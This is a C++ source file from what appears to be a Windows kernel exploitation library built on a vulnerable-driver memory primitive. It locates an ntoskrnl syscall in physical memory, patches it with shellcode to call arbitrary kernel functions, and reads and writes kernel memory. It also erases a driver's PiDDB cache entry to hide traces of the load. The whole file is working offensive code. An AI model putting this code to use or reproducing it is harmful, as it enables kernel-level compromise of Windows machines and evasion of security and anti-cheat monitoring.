#include "vdm_ctx.hpp"

namespace vdm
{
	vdm_ctx::vdm_ctx()
	{
		// already found the syscall's physical page...
		if (vdm::syscall_address.load())
			return;

		vdm::ntoskrnl = reinterpret_cast<std::uint8_t*>(
			LoadLibraryExA("ntoskrnl.exe", NULL,
				DONT_RESOLVE_DLL_REFERENCES));

		nt_rva = reinterpret_cast<std::uint32_t>(
			util::get_kmodule_export(
				"ntoskrnl.exe",
				syscall_hook.first,
				true
			));

		vdm::nt_page_offset = nt_rva % PAGE_4KB;
		// for each physical memory range, make a thread to search it
		std::vector<std::thread> search_threads;
		for (auto ranges : util::pmem_ranges)
			search_threads.emplace_back(std::thread(
				&vdm_ctx::locate_syscall,
				this,
				ranges.first,
				ranges.second
			));

		for (std::thread& search_thread : search_threads)
			search_thread.join();
	}

	bool vdm_ctx::rkm(void* dst, void* src, std::size_t size)
	{
		static const auto ntoskrnl_memcpy =
			util::get_kmodule_export("ntoskrnl.exe", "memcpy");

		return this->syscall<decltype(&memcpy)>(
			ntoskrnl_memcpy, dst, src, size);
	}

	bool vdm_ctx::wkm(void* dst, void* src, std::size_t size)
	{
		static const auto ntoskrnl_memcpy =
			util::get_kmodule_export("ntoskrnl.exe", "memcpy");

		return this->syscall<decltype(&memcpy)>(
			ntoskrnl_memcpy, dst, src, size);
	}

	void vdm_ctx::locate_syscall(std::uintptr_t address, std::uintptr_t length) const
	{
		const auto page_data =
			reinterpret_cast<std::uint8_t*>(
				VirtualAlloc(
					nullptr,
					PAGE_4KB, MEM_COMMIT | MEM_RESERVE,
					PAGE_READWRITE
				));

		for (auto page = 0u; page < length; page += PAGE_4KB)
		{
			if (vdm::syscall_address.load())
				break;

			if (!read_phys(reinterpret_cast<void*>(address + page), page_data, PAGE_4KB))
				continue;

			// check the first 32 bytes of the syscall, if its the same, test that its the correct
			// occurrence of these bytes (since dxgkrnl is loaded into physical memory at least 2 times now)...
			if (!memcmp(page_data + nt_page_offset, ntoskrnl + nt_rva, 32))
				if (valid_syscall(reinterpret_cast<void*>(address + page + nt_page_offset)))
					syscall_address.store(
						reinterpret_cast<void*>(
							address + page + nt_page_offset));
		}
		VirtualFree(page_data, PAGE_4KB, MEM_DECOMMIT);
	}

	bool vdm_ctx::valid_syscall(void* syscall_addr) const
	{
		static std::mutex syscall_mutex;
		syscall_mutex.lock();

		static const auto proc =
			GetProcAddress(
				LoadLibraryA(syscall_hook.second),
				syscall_hook.first
			);

		// 0:  48 31 c0    xor rax, rax
		// 3 : c3          ret
		std::uint8_t shellcode[] = { 0x48, 0x31, 0xC0, 0xC3 };
		std::uint8_t orig_bytes[sizeof shellcode];

		// save original bytes and install shellcode...
		read_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
		write_phys(syscall_addr, shellcode, sizeof shellcode);

		auto result = reinterpret_cast<NTSTATUS(__fastcall*)(void)>(proc)();
		write_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
		syscall_mutex.unlock();
		return result == STATUS_SUCCESS;
	}

	bool vdm_ctx::clear_piddb_cache(const std::string& file_name, const std::uint32_t timestamp)
	{
		static const auto piddb_lock =
			util::memory::get_piddb_lock();

		static const auto piddb_table =
			util::memory::get_piddb_table();

		if (!piddb_lock || !piddb_table)
			return false;

		static const auto ex_acquire_resource =
			util::get_kernel_export(
				"ntoskrnl.exe",
				"ExAcquireResourceExclusiveLite"
			);

		static const auto lookup_element_table =
			util::get_kernel_export(
				"ntoskrnl.exe",
				"RtlLookupElementGenericTableAvl"
			);

		static const auto release_resource =
			util::get_kernel_export(
				"ntoskrnl.exe",
				"ExReleaseResourceLite"
			);

		static const auto delete_table_entry =
			util::get_kernel_export(
				"ntoskrnl.exe",
				"RtlDeleteElementGenericTableAvl"
			);

		if (!ex_acquire_resource || !lookup_element_table || !release_resource)
			return false;

		PiDDBCacheEntry cache_entry;
		const auto drv_name = std::wstring(file_name.begin(), file_name.end());
		cache_entry.time_stamp = timestamp;
		RtlInitUnicodeString(&cache_entry.driver_name, drv_name.data());

		using ExAcquireResourceExclusiveLite = BOOLEAN(__stdcall*)(void*, bool);
		using RtlLookupElementGenericTableAvl = PIDCacheobj * (__stdcall*) (void*, void*);
		using RtlDeleteElementGenericTableAvl = bool(__stdcall*)(void*, void*);
		using ExReleaseResourceLite = bool(__stdcall*)(void*);

		//
		// ExAcquireResourceExclusiveLite
		//
		if (!syscall<ExAcquireResourceExclusiveLite>(ex_acquire_resource, piddb_lock, true))
			return false;

		//
		// RtlLookupElementGenericTableAvl
		//
		PIDCacheobj* found_entry_ptr =
			syscall<RtlLookupElementGenericTableAvl>(
				lookup_element_table,
				piddb_table,
				reinterpret_cast<void*>(&cache_entry)
				);

		if (found_entry_ptr)
		{

			//
			// unlink entry.
			//
			PIDCacheobj found_entry = rkm<PIDCacheobj>((uintptr_t)found_entry_ptr);
			LIST_ENTRY NextEntry = rkm<LIST_ENTRY>((uintptr_t)found_entry.list.Flink);
			LIST_ENTRY PrevEntry = rkm<LIST_ENTRY>((uintptr_t)found_entry.list.Blink);

			PrevEntry.Flink = found_entry.list.Flink;
			NextEntry.Blink = found_entry.list.Blink;

			wkm<LIST_ENTRY>((uintptr_t)found_entry.list.Blink, PrevEntry);
			wkm<LIST_ENTRY>((uintptr_t)found_entry.list.Flink, NextEntry);

			//
			// delete entry.
			//
			syscall<RtlDeleteElementGenericTableAvl>(delete_table_entry, piddb_table, found_entry_ptr);

			//
			// ensure the entry is 0
			//
			auto result = syscall<RtlLookupElementGenericTableAvl>(
				lookup_element_table,
				piddb_table,
				reinterpret_cast<void*>(&cache_entry)
				);

			syscall<ExReleaseResourceLite>(release_resource, piddb_lock);
			return !result;
		}
		syscall<ExReleaseResourceLite>(release_resource, piddb_lock);
		return false;
	}
}